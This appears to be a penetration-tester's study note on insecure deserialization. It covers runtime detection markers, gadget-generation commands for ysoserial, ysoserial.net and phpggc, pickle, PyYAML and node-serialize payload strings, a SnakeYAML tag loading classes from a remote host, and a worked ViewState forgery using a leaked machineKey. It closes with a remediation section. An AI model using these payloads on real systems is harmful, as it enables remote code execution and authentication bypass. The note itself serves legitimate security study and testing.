---
type: technique
title: Insecure deserialization
lang: en
status: active
wstg: ["WSTG-INPV-23"]
owasp_top10: ["A08:2021"]
owasp_api: []
asvs: ["V1.5.2"]
cwe: ["CWE-502"]
attack: ["T1059"]
cvss: ""
sources: [payloadsallthethings, hacktricks, colleague-web-wiki]
updated: 2026-09-17
---

# Insecure deserialization

**TL;DR** — When an app rebuilds objects from attacker-controlled serialized data with a
**native deserializer**, crafted input triggers a **gadget chain** — existing classes whose
magic methods run during/after deserialization — reaching **RCE** (or auth bypass / DoS). You
rarely write the exploit by hand: identify the runtime from a marker, then generate a gadget with
the matching tool (`ysoserial`, `ysoserial.net`, `phpggc`, pickle `__reduce__`). The #1 gap the
0xdf HTB gap-analysis surfaced (Node, Python, PHP and .NET boxes).

> Framework: **A08:2021 – Software & Data Integrity Failures**, `CWE-502`, WSTG `WSTG-INPV-23`,
> ASVS `V1.5.2` (safe deserialization).
> ⚠️ **AV/OneDrive note:** real gadget **blobs** (long `ysoserial`/`phpggc`/pickle output) are
> kept **off** this Defender-synced vault — only markers + tool command-lines with `<CMD>`
> placeholders are stored. Generate the live payload at test time.

## Where it applies

Anywhere serialized objects cross a trust boundary: session/auth **cookies**, hidden fields
(**`__VIEWSTATE`**), API bodies, message queues, **caches** (Redis/`FileBasedCache`), and
**uploads**. A "looks-like-base64" cookie that changes app behaviour when tampered is the classic
lead.

## Detection — identify the runtime from the marker

| Runtime | Hex magic | Base64 prefix | Text markers |
|---|---|---|---|
| **Java** | `AC ED 00 05` | `rO0` (gzip `H4sIAAA`) | `Content-Type: application/x-java-serialized-object` |
| **.NET** BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD` | long `FF FF FF FF` run |
| **.NET** ViewState | `FF 01` | `/wE…` | `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__VIEWSTATEENCRYPTED` |
| **PHP** | `4F 3A` (`O:`) | `Tz` | `O:`,`a:`,`s:`,`i:`,`b:` + length ints |
| **Python** pickle | `80 04 95` (`\x80`) | `gASV` | opcodes `(lp0`, `S'…'` |
| **Ruby** Marshal | `04 08` | `BAgK` | `\x04\x08` prefix |
| **Node** node-serialize | — | — | `_$$ND_FUNC$$_` (funcster: `__js_function`) |

Tamper a byte and replay: if it still parses/behaves, it's being deserialized without integrity
protection.

## Per-runtime exploitation

### PHP — object injection / PHAR

- **Sink:** `unserialize($input)`; **magic methods** `__wakeup`/`__destruct`/`__toString` fire the
  chain. `phar://` triggers deserialization of a Phar's metadata in **any** file op
  (`file_get_contents`, `include`, `getimagesize`) — no `unserialize()` needed (see [[lfi]]).
- **Gadget/tool — `phpggc`:**
  ```bash
  phpggc Laravel/RCE9 system id                        # framework POP chain → stdout blob
  phpggc Monolog/RCE2 system '<CMD>' -p phar -o x.phar  # wrap in a Phar for phar:// sinks
  ```
- **Auth-bypass via type juggling** (no gadget): a serialized `bool true` where a password is
  compared: `a:2:{s:8:"username";b:1;s:8:"password";b:1;}`.

### Python — pickle / PyYAML

- **Sink:** `pickle.loads` / `_pickle` / `jsonpickle.decode`; `yaml.unsafe_load` (or
  `yaml.load(x, Loader=UnsafeLoader)`).
- **Gadget:** a class whose `__reduce__` returns a callable + args (built at test time):
  ```python
  # class Exploit: def __reduce__(self): return (os.system, ("<CMD>",))
  # pickle.dumps(Exploit())  -> base64 blob (generate off-vault)
  ```
  PyYAML tag payload: `!!python/object/apply:os.system ["<CMD>"]`.
- Real trigger seen on HTB *HackNet*: a **world-writable Django `FileBasedCache`** `.djcache` file
  replaced with a `subprocess.Popen` pickle, executed on the next cached view.

### Node.js — `node-serialize` / funcster

- **Sink:** `require('node-serialize').unserialize(input)` passes a flagged value to `eval`.
- **Gadget:** an **immediately-invoked function** — the trailing `()` auto-runs on deserialize
  (CVE-2017-5941):
  ```javascript
  {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('<CMD>'); }()"}
  ```
  Base64/URL-encode into the cookie/param. (HTB *Celestial*, *NodeBlog*.) Related:
  [[prototype-pollution]] gadgets reach `process.mainModule.require('child_process')`.

### Java — `ObjectInputStream` / Jackson / SnakeYAML

- **Sink:** `readObject()`; Jackson `readValue` with `enableDefaultTyping`/polymorphic types;
  `SnakeYAML.load`; JSF client-side ViewState (`rO0`).
- **Gadget/tool — `ysoserial`:**
  ```bash
  java -jar ysoserial.jar CommonsCollections1 '<CMD>' > payload.bin   # pick chain by classpath
  java -jar ysoserial.jar URLDNS http://<collab>                       # blind detection (DNS only)
  ```
  `marshalsec` for SnakeYAML/XStream JDK-only RCE. SnakeYAML tag:
  `!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://<host>/"] ]]]`.

### .NET — BinaryFormatter / Json.Net / ViewState

- **Sink:** `BinaryFormatter.Deserialize`, `LosFormatter`, `NetDataContractSerializer`,
  `JsonConvert.DeserializeObject(..., TypeNameHandling≠None)`, `XmlSerializer(userType)`.
- **Gadget/tool — `ysoserial.net`:**
  ```bash
  ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "<CMD>"
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "<CMD>"
  ```
  Core gadgets: **ObjectDataProvider**, **ExpandedWrapper**, **TypeConfuseDelegate**,
  **TextFormattingRunProperties**.

#### .NET ViewState — the exam-trap chain (leaked `machineKey` → RCE)

`__VIEWSTATE` is deserialized by `ObjectStateFormatter`. If the **`machineKey`** (validation +
decryption keys) leaks — via [[lfi]]/[[directory-traversal]] reading `web.config`, an SSI include,
or a committed sample key — you can forge a valid, signed (and encrypted) ViewState:

```bash
# grab __VIEWSTATEGENERATOR from the page; delete __VIEWSTATEENCRYPTED when forging (else MAC error)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<CMD>" \
  --path="/page.aspx" --apppath="/" --generator=<VIEWSTATEGENERATOR> \
  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>" \
  --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"
```
Find/confirm keys with **Blacklist3r** or **Badsecrets** (`badsecrets --url …`). `enableViewStateMac=false`
(legacy) means **no key needed** at all. (HTB *Perspective*.) The same leaked `machineKey` also
forges `.ASPXAUTH` Forms-auth cookies → admin.

### Ruby — Marshal / YAML

- **Sink:** `Marshal.load`/`Marshal.restore`; `YAML.load` (Psych < 4). Marker `\x04\x08` / `BAgK`.
- **Gadget:** universal YAML/Marshal chains (elttam) reaching `Kernel.system`; generate off-vault.

## Worked example — .NET ViewState via a leaked machineKey

1. **Fingerprint:** the app is ASP.NET WebForms; every page carries `__VIEWSTATE` +
   `__VIEWSTATEGENERATOR`. Tampering `__VIEWSTATE` → a MAC/500 error ⇒ it's validated (need the key).
2. **Leak the key:** a traversal/LFI (`?file=..\..\web.config`) or SSI include discloses
   `<machineKey validationKey="…" decryptionKey="…" validation="SHA1" decryption="AES"/>`.
3. **Forge:** run the `ysoserial.net -p ViewState …` command above with the leaked keys, the
   `--generator` value, and `-c "<CMD>"` (`whoami` to prove).
4. **Fire:** POST the forged `__VIEWSTATE` → the command runs as the app-pool identity → RCE;
   pivot to a [[reverse-shells|reverse shell]].

## Confirming impact

A benign `whoami`/`id`/DNS callback proves execution; then a shell. Severity **Critical** (RCE).
For blind cases use `ysoserial URLDNS`/a Collaborator callback.

## Remediation

- **Don't deserialize untrusted data with native deserializers** — use a **data-only format**
  (JSON, schema-validated XML) instead (ASVS `V1.5.2`).
- If unavoidable: **type allowlist** (`ObjectInputStream.resolveClass`/JEP-290 filters; Json.Net
  `SerializationBinder`; PHP `unserialize($d, ['allowed_classes'=>false])`; `yaml.safe_load`) +
  length/object-count caps; mark sensitive fields `transient`.
- Avoid `eval`/SpEL (ASVS `V1.3.2`) and sanitize before JNDI (`V1.3.8`). For .NET: **rotate any
  exposed `machineKey`**, never reuse sample keys, keep ViewState MAC+encryption on, set a per-user
  `ViewStateUserKey`. Patch gadget-bearing libs. (Control set: [[colleague-web-wiki|deserialization-hardening]].)

## Quick checklist

- [ ] A base64/serialized blob in a cookie / hidden field / `__VIEWSTATE` / cache / upload?
- [ ] Identify the runtime from the marker (table above); tamper-and-replay to confirm it deserializes.
- [ ] Match the tool: `phpggc` / pickle `__reduce__` / node `_$$ND_FUNC$$_` / `ysoserial` / `ysoserial.net`.
- [ ] .NET ViewState → leak `machineKey` (web.config via [[lfi]]) → `ysoserial.net -p ViewState`.
- [ ] Confirm `whoami`/`id` (or a DNS callback for blind) → [[reverse-shells|shell]].

## See also

[[file-upload]] · [[lfi]] · [[jwt-attacks]] · [[prototype-pollution]] · [[command-injection]] · [[reverse-shells]] · [[oswa-exam]]

*Sources: [[payloadsallthethings]] + [[hacktricks]] (per-runtime markers, gadget tools, ViewState machineKey flags); [[colleague-web-wiki]] (WSTG-INPV-23 / deserialization-hardening, ASVS V1.5.2). 0xdf HTB gap-analysis: Celestial, NodeBlog, HackNet, Chemistry, Catch, Perspective, Pollution.*
